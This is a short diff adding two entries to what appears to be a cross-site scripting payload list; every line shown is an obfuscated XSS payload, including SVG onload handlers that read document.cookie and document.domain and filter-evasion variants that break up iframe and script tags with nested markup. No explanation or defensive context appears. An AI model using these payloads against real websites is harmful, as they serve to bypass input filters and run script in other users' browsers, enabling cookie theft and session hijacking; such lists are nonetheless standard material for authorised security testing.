@@ -2,3 +2,5 @@
 "/><svg+svg+svg\/\/On+OnLoAd+%20=confirm(1)>
 <svg on onload=(alert)(document.domain)>
 <svg onload=alert&#0000000040document.cookie)>
+<</p>iframe src=javascript:alert()//
+<</div>script</div>>alert()<</div>/script</div>>
